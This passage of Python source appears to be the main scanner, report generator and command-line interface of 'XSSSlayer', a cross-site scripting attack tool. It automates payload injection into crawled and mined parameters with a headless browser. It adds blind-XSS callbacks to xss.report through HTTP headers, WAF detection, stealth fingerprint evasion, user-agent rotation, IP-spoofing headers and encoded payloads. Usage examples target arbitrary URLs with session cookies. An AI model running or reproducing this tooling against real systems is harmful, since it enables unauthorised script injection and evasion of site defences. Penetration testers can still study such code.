    progress.update(task_id, total=len(smart))

    task_objs = [
        asyncio.ensure_future(
            test_payload(ctx, target, pl, semaphore, results, progress, task_id,
                         nav_timeout=nav_timeout, jitter_min=jitter_min, jitter_max=jitter_max,
                         show_browser=show_browser, take_screenshot=take_screenshot,
                         cookies=cookies, proxy=proxy,
                         dialog_timeout=dialog_timeout, retry_delay=retry_delay,
                         background_tasks=background_tasks)
        )
        for pl in smart
    ]
    pending_tasks = set(task_objs)
    while pending_tasks:
        _done, pending_tasks = await asyncio.wait(pending_tasks, timeout=0.25)
        if pending_tasks and is_shutdown_requested():
            for t in pending_tasks:
                t.cancel()
            await asyncio.gather(*pending_tasks, return_exceptions=True)
            log_warn(f"Cancelled [bold yellow]{len(pending_tasks)}[/] in-flight requests.")
            return True
    return False


# ══════════════════════════════════════════════════════════════
#  HTML REPORT GENERATOR
# ══════════════════════════════════════════════════════════════
def _risk_level(r: dict) -> tuple[str, str]:
    """Return (level_name, badge_colour_hex) based on finding properties."""
    if r.get("xss_type") == "DOM":
        return ("HIGH",     "#e6a817")
    if r.get("is_json"):
        return ("HIGH",     "#e6a817")
    if "blind" in r.get("payload","").lower() or "xss.report" in r.get("payload",""):
        return ("CRITICAL", "#c0392b")
    return ("CRITICAL", "#c0392b")

def generate_html_report(results: list, elapsed: float, target_url: str) -> str:
    ts_now   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ts_file  = datetime.now().strftime("%Y%m%d_%H%M%S")
    _ensure_dirs()
    report_path = RESULTS_DIR / f"report_{ts_file}.html"

    rows_html = ""
    for i, r in enumerate(results, 1):
        risk_name, risk_color = _risk_level(r)
        ss_cell = "—"
        if r.get("screenshot"):
            ss_path_rel = Path(r["screenshot"]).name
            ss_cell = (f'<a href="screenshots/{html_escape(ss_path_rel)}" target="_blank">'
                       f'<img src="screenshots/{html_escape(ss_path_rel)}" '
                       f'style="max-width:120px;border-radius:4px;border:1px solid #30363d"></a>')
        rows_html += f"""
        <tr>
            <td style="color:#8b949e">{i}</td>
            <td style="word-break:break-all">{html_escape(r.get('source_page','')[:60])}</td>
            <td style="color:#f0883e;font-weight:bold">{html_escape(r.get('param',''))}</td>
            <td style="color:#a5d6ff">{html_escape(r.get('dialog','') or '(empty)')}</td>
            <td><span style="background:{risk_color};color:#fff;padding:2px 8px;
                border-radius:10px;font-size:11px;font-weight:bold">{risk_name}</span></td>
            <td style="font-family:monospace;font-size:12px;word-break:break-all;color:#7ee787">
                {html_escape(r.get('payload','')[:120])}</td>
            <td>{ss_cell}</td>
        </tr>"""

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSSSlayer {VERSION} — Report</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',system-ui,monospace;padding:24px}}
  .header{{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);
           border:1px solid #21262d;border-radius:12px;padding:28px 32px;margin-bottom:24px}}
  .header h1{{font-size:2rem;font-weight:700;background:linear-gradient(90deg,#58a6ff,#bc8cff);
              -webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}}
  .header .sub{{color:#8b949e;font-size:14px}}
  .header .sig{{color:#79c0ff;font-size:13px;margin-top:6px}}
  .stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:24px}}
  .stat-card{{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:16px 20px;text-align:center}}
  .stat-card .val{{font-size:2rem;font-weight:700;color:#7ee787}}
  .stat-card .lbl{{font-size:12px;color:#8b949e;margin-top:4px}}
  .stat-card.crit .val{{color:#ff7b72}}
  .findings-header{{color:#58a6ff;font-size:1.1rem;font-weight:600;margin-bottom:12px;
                    padding-bottom:8px;border-bottom:1px solid #21262d}}
  table{{width:100%;border-collapse:collapse;background:#161b22;border-radius:10px;overflow:hidden;
         border:1px solid #21262d}}
  th{{background:#21262d;color:#8b949e;font-size:12px;font-weight:600;text-transform:uppercase;
      letter-spacing:0.5px;padding:12px 14px;text-align:left}}
  td{{padding:11px 14px;border-bottom:1px solid #21262d;font-size:13px;vertical-align:top}}
  tr:last-child td{{border-bottom:none}}
  tr:hover{{background:#1c2128}}
  .footer{{text-align:center;color:#484f58;font-size:12px;margin-top:24px;
           padding-top:16px;border-top:1px solid #21262d}}
  .no-results{{text-align:center;padding:48px;color:#8b949e;font-size:16px}}
</style>
</head>
<body>
<div class="header">
  <h1>⚡ XSSSlayer {VERSION} — Security Report</h1>
  <div class="sub">Scan Target: <strong style="color:#e6edf3">{html_escape(target_url)}</strong>
    &nbsp;·&nbsp; Generated: {ts_now}
    &nbsp;·&nbsp; Elapsed: {elapsed:.1f}s</div>
  <div class="sig">Developed by <strong>alisalive.exe</strong>
    &nbsp;|&nbsp; ig: <strong>alisalive.exe</strong></div>
</div>

<div class="stats">
  <div class="stat-card crit">
    <div class="val">{len(results)}</div>
    <div class="lbl">XSS Confirmed</div>
  </div>
  <div class="stat-card">
    <div class="val" style="color:#79c0ff">{sum(1 for r in results if r.get('screenshot'))}</div>
    <div class="lbl">Screenshots</div>
  </div>
  <div class="stat-card">
    <div class="val" style="color:#f0883e">{elapsed:.0f}s</div>
    <div class="lbl">Scan Duration</div>
  </div>
  <div class="stat-card">
    <div class="val" style="color:#bc8cff">{len(set(r.get('param','') for r in results))}</div>
    <div class="lbl">Unique Params</div>
  </div>
</div>

<div class="findings-header">🔥 Confirmed Vulnerabilities ({len(results)})</div>
{"<table><thead><tr><th>#</th><th>Source Page</th><th>Parameter</th><th>Dialog</th><th>Risk</th><th>Payload</th><th>PoC Screenshot</th></tr></thead><tbody>" + rows_html + "</tbody></table>" if results else '<div class="no-results">✅ No XSS vulnerabilities confirmed on this target.</div>'}

<div class="footer">
  XSSSlayer {VERSION} (Official Release) — For authorized penetration testing only.<br>
  Developed by <strong>alisalive.exe</strong>
</div>
</body>
</html>"""

    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html_content)
    return str(report_path)


# ══════════════════════════════════════════════════════════════
#  MAIN SCANNER
# ══════════════════════════════════════════════════════════════
async def run_scan(args) -> None:
    print_banner()

    url             = args.url
    param           = args.param
    concurrency     = args.concurrency
    nav_timeout     = args.timeout * 1000       # convert s → ms
    jitter_min      = args.jitter[0]
    jitter_max      = args.jitter[1]
    show_browser    = args.show_browser
    take_screenshot = args.screenshot
    max_pages       = args.max_pages
    no_mine         = args.no_mine
    cookie_str      = args.cookie
    xss_report_id   = args.xss_report
    oob_context     = args.oob_context
    proxy           = args.proxy
    retry_delay     = args.retry_delay
    auto_mode       = (param is None)
    dialog_timeout  = DIALOG_TIMEOUT

    # ── --fast mode: trade some delayed-dialog detection for raw speed ──
    if args.fast:
        dialog_timeout = 1200
        if args.jitter == [JITTER_MIN, JITTER_MAX]:      # user didn't override jitter
            jitter_min, jitter_max = 0.02, 0.08
        if args.concurrency == SEMAPHORE_LIMIT:          # user didn't override concurrency
            concurrency = 40
        log_bypass(
            f"[bold bright_yellow]--fast mode[/] enabled: "
            f"dialog_timeout=1200ms, jitter={jitter_min}-{jitter_max}s, concurrency={concurrency}"
        )

    # Parse cookies
    session_cookies: list[dict] = []
    if cookie_str:
        session_cookies = parse_cookies(cookie_str, url)
        log_info(f"Session cookies: [bold bright_yellow]{len(session_cookies)}[/] loaded")

    if take_screenshot:
        _ensure_dirs()

    # Print configuration
    log_info(f"Target URL      : [bright_cyan]{url}[/]")
    log_info(f"Mode            : [bold]{'AUTO-DISCOVERY' if auto_mode else 'MANUAL'}[/]")
    if not auto_mode:
        log_info(f"Parameter       : [bright_yellow]{param}[/]")
    log_info(f"Concurrency     : [bright_green]{concurrency}[/] tabs")
    log_info(f"Timeout         : [bright_green]{args.timeout}s[/]")
    log_info(f"Jitter          : [bright_green]{jitter_min}–{jitter_max}s[/]")
    log_info(f"Retry delay     : [bright_green]{retry_delay}s[/] (on 403/429 backoff)")
    if proxy:
        log_info(f"Proxy           : [bright_cyan]{proxy}[/]")
    if take_screenshot:
        log_poc(f"Screenshots     : [bright_green]ON[/] → [dim]{SCREENSHOTS_DIR}[/]")
    if show_browser:
        log_poc(f"Live PoC GUI    : [bold bright_yellow]ON[/] (visible window on confirm)")
    if xss_report_id:
        log_oob(f"Blind XSS / OOB : [bold bright_red]ON[/] → xss.report/c/{xss_report_id}")
    log_stealth(f"Stealth         : [green]ON[/] (webdriver·plugins·WebGL·chrome·screen)")
    log_bypass( f"UA Rotation     : [green]ON[/] ({len(FAKE_USER_AGENTS)} agents)")
    log_bypass( f"IP Spoofing     : [green]ON[/] (X-Forwarded-For / X-Real-IP ...)")
    log_bypass( f"Payload Encode  : [green]ON[/] (URL + double-URL + base64 + hex)")
    log_ctx(    f"Context Anal.   : [green]ON[/] (12 context types)")
    log_fuzz(   f"Fuzzing Engine  : [green]ON[/] ({len(PROBE_CHARS)} probe chars)")
    log_dom(    f"DOM / SPA XSS   : [green]ON[/] (#fragment + MutationObserver)")
    log_ai(     f"AI Heuristic    : [green]ON[/] (encoding + event-shuffle + junk + case)")
    if not no_mine:
        log_mine(f"Param Mining    : [green]ON[/] (hidden + JS + JSON POST)")
    console.print()

    payloads  = load_payloads()
    results:  list = []
    background_tasks: list = []
    semaphore = AdaptiveConcurrency(concurrency, background_tasks=background_tasks)
    targets:  list[ScanTarget] = []
    start = time.time()

    launch_opts: dict = {"headless": True, "args": ["--no-sandbox", "--disable-setuid-sandbox"]}
    if proxy:
        launch_opts["proxy"] = {"server": proxy}

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(**launch_opts)
        ctx     = await browser.new_context(ignore_https_errors=True)

        try:
            if session_cookies:
                await ctx.add_cookies(session_cookies)

            # ── Step 1: WAF Detection ──────────────────────────────
            log_info("[bold]Step 1[/] — WAF Detection ...")
            wp = await ctx.new_page()
            await apply_stealth(wp)
            await setup_page_bypass(wp, rand_ua(), rand_ip())
            waf = await detect_waf(wp, url)
            await wp.close()
            if waf:
                log_waf(f"[bold red]WAF Detected:[/] [bright_magenta]{waf}[/]")
            else:
                log_info("No WAF signature detected.")
            console.print()

            # ── Step 1b: Blind XSS / OOB header injection ──────────
            if oob_context:
                if xss_report_id:
                    log_oob("[bold]--oob-context[/] — injecting Blind XSS/OOB into headers ...")
                    blind_pls = build_blind_payloads(xss_report_id)
                    await inject_oob_headers(ctx, url, blind_pls, session_cookies, proxy)
                    console.print()
                else:
                    log_warn("--oob-context requires --xss-report ID — skipping header injection.")

            # ── Step 2: Target Discovery ───────────────────────────
            if auto_mode:
                log_info("[bold]Step 2[/] — Crawl + Form Discovery + Param Mining ...")
                targets = await auto_discover(ctx, url, max_pages, nav_timeout, mine=not no_mine)
                if not targets:
                    log_error("No injectable targets found. Exiting.")
                    return
            else:
                targets = [ScanTarget(url=url, param=param, source_page=url)]
                if not no_mine:
                    log_info("[bold]Step 2[/] — Param Mining ...")
                    mp = await ctx.new_page()
                    try:
                        await apply_stealth(mp)
                        await setup_page_bypass(mp, rand_ua(), rand_ip())
                        extra = await mine_params(mp, url, nav_timeout)
                    except Exception:
                        extra = []
                    finally:
                        await mp.close()
                    exist = {(t.url, t.param) for t in targets}
                    for t in extra:
                        if (t.url, t.param) not in exist:
                            targets.append(t); exist.add((t.url, t.param))
                    if extra:
                        log_mine(f"[bright_green]{len(extra)}[/] extra parameters found.")
                    console.print()

            # ── Step 3: Payload Scan ───────────────────────────────
            step = "3" if (auto_mode or not no_mine) else "2"
            log_info(
                f"[bold]Step {step}[/] — God Mode Scan: "
                f"[bright_yellow]{len(payloads)}[/] base payloads × "
                f"[bright_green]{len(targets)}[/] target(s)"
            )
            console.print()
            start = time.time()

            with Progress(
                SpinnerColumn(spinner_name="dots", style="bright_cyan"),
                TextColumn("[bold bright_cyan]{task.description}"),
                BarColumn(bar_width=36, style="bright_magenta", complete_style="bright_green"),
                TaskProgressColumn(),
                TextColumn("[dim]{task.completed}/{task.total}[/dim]"),
                TimeElapsedColumn(),
                console=console, transient=False,
            ) as prog:
                interrupted = False
                for ti, target in enumerate(targets, 1):
                    if is_shutdown_requested():
                        interrupted = True
                        break
                    short = target.source_page.split("?")[0][-28:]
                    tid   = prog.add_task(f"[{ti}/{len(targets)}] {short} → {target.param}",
                                          total=len(payloads))
                    interrupted = await scan_one_target(
                        ctx, target, payloads, semaphore, results, prog, tid,
                        nav_timeout=nav_timeout, jitter_min=jitter_min, jitter_max=jitter_max,
                        show_browser=show_browser, take_screenshot=take_screenshot,
                        cookies=session_cookies, proxy=proxy, xss_report_id=xss_report_id,
                        dialog_timeout=dialog_timeout, background_tasks=background_tasks,
                        waf=waf, retry_delay=retry_delay,
                    )
                    if interrupted:
                        break

                # ── Step 4: DOM XSS (URL fragment scan) ───────────
                if not interrupted:
                    console.print()
                    log_info(f"[bold]Step {int(step)+1}[/] — DOM / SPA XSS (URL fragment scan) ...")
                    dom_page = await ctx.new_page()
                    try:
                        await apply_stealth(dom_page)
                        await setup_page_bypass(dom_page, rand_ua(), rand_ip())
                        dom_findings = await check_dom_xss(
                            dom_page, url, payloads, nav_timeout, jitter_min, jitter_max,
                            dialog_timeout=dialog_timeout,
                        )
                        for df in dom_findings:
                            if take_screenshot:
                                df["screenshot"] = await take_poc_screenshot(dom_page, df)
                            results.append(df)
                    except Exception as e:
                        log_warn(f"DOM XSS scan error: {e}")
                    finally:
                        await dom_page.close()

        finally:
            if background_tasks:
                for t in background_tasks:
                    if not t.done():
                        t.cancel()
                await asyncio.gather(*background_tasks, return_exceptions=True)
            try:
                await asyncio.wait_for(browser.close(), timeout=5)
            except Exception:
                pass

    elapsed = time.time() - start
    console.print()
    _print_results(results, elapsed, len(targets))

    # ── HTML Report ────────────────────────────────────────────
    try:
        report_path = generate_html_report(results, elapsed, url)
        log_poc(f"HTML Report → [bold bright_cyan]{report_path}[/]")
    except Exception as e:
        log_warn(f"HTML report generation failed: {e}")

    if args.output:
        _save_results(results, args.output)


# ══════════════════════════════════════════════════════════════
#  RESULTS DISPLAY
# ══════════════════════════════════════════════════════════════
def _print_results(results: list, elapsed: float, target_count: int) -> None:
    console.print()
    console.rule("[bold bright_cyan]  SCAN COMPLETE  [/]", style="bright_cyan")
    console.print()

    s = Table(box=box.ROUNDED, border_style="bright_cyan", show_header=False, padding=(0, 2))
    s.add_column("K", style="bold bright_yellow")
    s.add_column("V", style="bright_white")
    s.add_row("Targets Scanned",        str(target_count))
    s.add_row("XSS Confirmed (dialog)", f"[bold bright_green]{len(results)}[/]")
    ss_count = sum(1 for r in results if r.get("screenshot"))
    if ss_count:
        s.add_row("Screenshots Saved", str(ss_count))
    s.add_row("Elapsed", f"{elapsed:.1f}s")
    console.print(Align.center(s))
    console.print()

    if not results:
        console.print(Align.center(Text(
            "  No XSS dialogs triggered on this target.  ",
            style="bold yellow on dark_orange3"
        )))
        return

    has_ss = any(r.get("screenshot") for r in results)
    t = Table(
        title="[bold bright_green] XSS VULNERABILITIES CONFIRMED [/]",
        box=box.DOUBLE_EDGE, border_style="bright_green",
        show_lines=True, padding=(0, 1),
    )
    t.add_column("#",      style="dim",                width=4)
    t.add_column("Source", style="cyan",               no_wrap=False)
    t.add_column("Type",   style="bright_magenta",     width=10)
    t.add_column("Param",  style="bold bright_yellow", width=14)
    t.add_column("Dialog", style="bright_white",       width=14)
    if has_ss:
        t.add_column("Screenshot", style="dim green", no_wrap=False)
    t.add_column("Payload", style="cyan", no_wrap=False)

    for i, r in enumerate(results, 1):
        src  = r.get("source_page","").split("?")[0][-35:]
        row  = [str(i), src,
                r.get("xss_type","Reflected"),
                r.get("param",""),
                r.get("dialog","") or "(empty)"]
        if has_ss:
            ss = Path(r["screenshot"]).name if r.get("screenshot") else "—"
            row.append(ss)
        row.append(r.get("payload","")[:80])
        t.add_row(*row)

    console.print(t)
    console.print()


def _save_results(results: list, path: str) -> None:
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        log_info(f"JSON results → [bold bright_cyan]{path}[/]")
    except Exception as e:
        log_error(f"Failed to save results: {e}")


# ══════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════
def parse_args():
    p = argparse.ArgumentParser(
        prog="xss_slayer",
        description=f"XSSSlayer {VERSION} — by alisalive.exe  |  ig: alisalive.exe  |  github: alisalive",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Version : {VERSION} (Official Release)
Author  : alisalive.exe
ig      : alisalive.exe
github  : alisalive

Examples:
  # Auto-Discovery — full god mode:
  python xss_slayer.py -u "http://target.com"

  # Manual mode — specific parameter:
  python xss_slayer.py -u "http://target.com/search?q=x" -p q

  # With session cookie (for authenticated panels):
  python xss_slayer.py -u "http://target.com/admin" -p id --cookie "session=abc123"

  # Blind XSS / OOB callback:
  python xss_slayer.py -u "http://target.com" --xss-report YOUR_CALLBACK_ID

  # With proxy (Burp Suite):
  python xss_slayer.py -u "http://target.com" --proxy http://127.0.0.1:8080

  # Full god mode:
  python xss_slayer.py -u "http://target.com" \\
      --cookie "session=abc" --xss-report ID \\
      --show-browser --screenshot --proxy http://127.0.0.1:8080 \\
      --max-pages 60 --timeout 20 --jitter 0.5 2.0 \\
      --concurrency 25 -o results.json
        """,
    )

    # Target
    p.add_argument("-u", "--url",         required=True,
                   help="Target URL (base URL or URL with params)")
    p.add_argument("-p", "--param",       default=None,
                   help="Parameter to inject. Omit -> Auto-Discovery mode")

    # Performance
    p.add_argument("-c", "--concurrency", type=int,   default=SEMAPHORE_LIMIT,
                   help=f"Concurrent browser tabs (default: {SEMAPHORE_LIMIT})")
    p.add_argument("--timeout",           type=int,   default=15,
                   help="Navigation timeout in seconds (default: 15)")
    p.add_argument("--jitter",            type=float, nargs=2, default=[JITTER_MIN, JITTER_MAX],
                   metavar=("MIN", "MAX"),
                   help=f"Random delay range in seconds (default: {JITTER_MIN} {JITTER_MAX})")
    p.add_argument("--max-pages",         type=int,   default=MAX_CRAWL_PAGES,
                   help=f"Max pages to crawl in Auto-Discovery mode (default: {MAX_CRAWL_PAGES})")
    p.add_argument("--fast",              action="store_true",
                   help="Speed mode: near-zero jitter, dialog_timeout=1200ms, concurrency=40 "
                        "(trades some delayed-dialog detection for raw speed)")

    # Network
    p.add_argument("--proxy",             default=None,
                   help="HTTP proxy URL e.g. http://127.0.0.1:8080 (Burp Suite)")
    p.add_argument("--cookie",            default=None,
                   help='Session cookies e.g. "session=abc123; token=xyz"')
    p.add_argument("--retry-delay",       type=int,   default=RATE_LIMIT_DELAY,
                   help=f"Backoff delay in seconds on 403/429 responses (default: {RATE_LIMIT_DELAY})")

    # Features
    p.add_argument("--xss-report",        default=None, metavar="ID",
                   help="xss.report callback ID for Blind XSS / OOB detection")
    p.add_argument("--oob-context",       action="store_true",
                   help="Also inject Blind XSS/OOB payloads into Referer, User-Agent, "
                        "and X-Forwarded-For headers (requires --xss-report)")
    p.add_argument("--screenshot",        action="store_true",
                   help="Save full-page screenshot on each confirmed XSS")
    p.add_argument("--show-browser",      action="store_true",
                   help="Open a VISIBLE browser window on XSS confirm (live PoC)")
    p.add_argument("--no-mine",           action="store_true",
                   help="Skip parameter mining (hidden fields, JS hints, JSON POST)")

    # Output
    p.add_argument("-o", "--output",      default=None,
                   help="Save confirmed results to JSON file")

    return p.parse_args()


def _install_sigint_handler():
    """
    Replace the default SIGINT handler so Ctrl+C never raises
    KeyboardInterrupt into arbitrary running code. First press sets the
    cooperative shutdown flag; a second, impatient press force-exits.
    See xssslayer_entry.py for the full rationale.
    """
    pressed = False

    def handler(signum, frame):
        nonlocal pressed
        if pressed:
            os._exit(1)
        pressed = True
        console.print(
            "\n[bold red]Scan interrupted by user.[/] "
            "[dim]Finishing current batch and closing browser gracefully...[/]"
        )
        request_shutdown()

    signal.signal(signal.SIGINT, handler)


if __name__ == "__main__":
    args = parse_args()

    # Validate jitter range
    if args.jitter[0] > args.jitter[1]:
        args.jitter = [args.jitter[1], args.jitter[0]]

    _install_sigint_handler()
    asyncio.run(run_scan(args))
    sys.exit(0)
